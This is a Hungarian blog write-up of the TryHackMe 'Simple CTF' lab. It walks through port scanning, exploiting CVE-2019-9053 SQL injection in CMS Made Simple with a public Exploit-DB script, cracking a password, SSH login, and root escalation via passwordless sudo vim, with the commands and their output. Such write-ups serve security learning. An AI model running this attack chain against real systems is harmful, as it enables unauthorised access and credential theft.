---
title: Simple CTF - Beginner level ctf
date: 2021-07-14 21:45:00 +0200
categories: [Tryhackme, Simple CTF]
tags: [Tryhackme, CTF,easy]  
comments: false
pin: false
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/f28ade2b51eb7aeeac91002d41f29c47.png
  alt: image alternative text
---
## Tryhackme room link:
><a href="https://tryhackme.com/room/easyctf">`Simple CTF`</a>

<h1 style="color: #a9db92 ;"><b>IP</b></h1>

Hogy ne felejtsük el, exportáljuk a `tryhackme`-s `IP`-t az adott terminálba.

```bash
export IP=10.10.231.115
```

<h1 style="color: #a9db92 ;"><b>ENUMERÁCIÓ</b></h1>

Kezdjünk egy `nmap`-el, scanneljük le az első 1000 portot:

~~~bash
nmap -sSV -A -p1-1000 -Pn -vv -oA simple_ctf.p1000 $IP
~~~

Kimenet:

~~~report
[...]

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.9.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

[...]
~~~

<h1 style="color: #a9db92 ;"><b>1 - How many services are running under port 1000?</b></h1>
>Vagyis, hány szolgáltatás fut az 1000-es port alatt?

Látjuk, hogy fut a `vsftpd 3.0.3` és be van kapcsolva az `Anonymous FTP login`, valamint fut a 80-as porton az `Apache httpd 2.4.18`.

># Válasz: 2

<hr>

<h1 style="color: #a9db92 ;"><b>2 - What is running on the higher port?</b></h1>
>Mi fut a legmagasabb (nyitott) porton?

~~~bash
nmap -sSV -A -p1000-65535 -Pn -vv -oA simple_ctf.p65535 $IP
~~~

Kimenet:

~~~report
[...]

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)

[...]
~~~

A legmagasabb port ami nyitva van az a `2222`-es. Ezen egy `ssh` szolgáltatás fut.
># válasz: SSH

<hr>

<h1 style="color: #a9db92 ;"><b>3 - What's the CVE you're using against the application?</b></h1>
>Mi az a CVE, amelyet az alkalmazás ellen használ? 

~~~bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 20 -u http://$IP/
~~~

Kimenet:

~~~report
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.231.115/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2021/07/14 22:47:37 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 302]
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess.php        (Status: 403) [Size: 301]
/.htpasswd.php        (Status: 403) [Size: 301]
/.hta.php             (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 301]
/.hta.txt             (Status: 403) [Size: 296]
/.hta.html            (Status: 403) [Size: 297]
/.htpasswd.html       (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]  
/robots.txt           (Status: 200) [Size: 929]  
/server-status        (Status: 403) [Size: 301]  
/simple               (Status: 301) [Size: 315] [--> http://10.10.231.115/simple/]
                                                                                  
===============================================================
2021/07/14 22:48:33 Finished
===============================================================
~~~

Ami innen fontos nekünk az a `/simple` mappa. A `http://$IP/simple/` mögött tárolt alkalmazás egy `CMS` rendszer (`CMS Made Simple 2.2.8 verzió`). Számos biztonsági rés létezik, de a legfontosabb a <a href="https://www.cvedetails.com/cve/CVE-2019-9053/">`CVE-2019-9053`</a>.
># válasz: CVE-2019-9053

<hr>

<h1 style="color: #a9db92 ;"><b>4 - To what kind of vulnerability is the application vulnerable?</b></h1>
>4 - Milyen sebezhetőségnek van kitéve ez az alkalmazás? 

Ez a `CVE` egy `SQL Injection`-ről szól, amelyet általában `sqli`-nek neveznek.
># Válasz: SQLi

<hr>

<h1 style="color: #a9db92 ;"><b>5 - What’s the password?</b></h1>
>Mi a jelszó?

Használjuk ki. A python-exploit itt érhető el: <a href="https://www.exploit-db.com/exploits/46635">`exploits/46635`</a> 

vagy, ha egyszerűbb megoldásra törekszünk:

~~~bash
searchsploit cms made simple 2.2.10
~~~

Kimenet:

~~~report
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                    | php/webapps/46635.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
~~~

Aztán kimásoljuk egy tetszőleges könyvtárba:

~~~bash
searchsploit -m php/webapps/46635.py ~/thm/machines/simple_ctf/
~~~

Ezután futtassuk le a python exploitot:

~~~bash
python 46635.py -u http://$IP/simple/ --crack -w /usr/share/dirb/wordlists/others/best110.txt
~~~

Kimenet:

~~~report
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
~~~

># Válasz: secret

<hr>

<h1 style="color: #a9db92 ;"><b>6 - Where can you login with the details obtained?</b></h1>
>6 - Hol lehet bejelentkezni a megszerzett adatokkal?



Ezeket a hitelesítő adatokat használhatjuk az `ssh` (2222-es porton futó) bejelentkezéshez:

># Válasz: SSH

<hr>

<h1 style="color: #a9db92 ;"><b>7 - What’s the user flag?</b></h1>
>7 - Mi a user flag?

Jelen esetben az `sshpass` nevű programot fogom segítségül hívni a sima `ssh`-hez. Ha neked nincs fent az `sshpass` akkor se csüggedj, apt-on fent van, tehát:

~~~bash
sudo apt-get update -y; sudo apt-get install sshpass -y
~~~

Ha ezzel megvagyunk használhatnánk is, ennek a parancsnak a kimenetében megkapjuk a `user.txt` eredményét:

~~~bash
sshpass -p secret ssh mitch@$IP -p 2222 cat user.txt
~~~

<hr>

<h1 style="color: #a9db92 ;"><b>8 - Is there any other user in the home directory? What’s its name?</b></h1>
>8 - Van-e más felhasználó a `home` könyvtárban? Mi a neve?

Találunk egy másik felhasználót a `/home` könyvtárban:

~~~bash
ls -l /home
~~~

Kimenet:

~~~report
total 8
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath
~~~

># Válasz: sunbath

<hr>

<h1 style="color: #a9db92 ;"><b>9 - What can you leverage to spawn a privileged shell?</b></h1>
> 9 - Mit tud kihasználni egy privilegizált shell létrehozására? 

Amikor csatlakozunk, úgy tűnik, hogy van egy testreszabott shellünk (pl. Nincs TAB befejezés). Ezt egyébként könnyű megkerülni:

~~~bash
mitch@Machine:~$ python -c 'import pty; pty.spawn("/bin/bash")'
~~~

Most van egy igazi shellünk! Lássuk, van-e sudo hozzáférésünk:

~~~bash
mitch@Machine:~$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
~~~

Tehát a vim root-ként futtatható jelszó nélkül.

~~~bash
mitch@Machine:/home$ sudo vim
~~~


Most a `vim`-ben írd be: `:shell` és `ENTER`. Hoppá! Van egy héjad `root` jogokkal! 

># Válasz: vim

<hr>

<h1 style="color: #a9db92 ;"><b>What's the root flag?</b></h1>
>Mi a root flag?

Ezt könnyen kideríthetjük már:

~~~bash
root@Machine:/home# cd /root/
root@Machine:/root# cat root.txt
 ~~~

<h1 style="color: #e35757;"><b>PWNED.</b></h1>

 <hr><hr>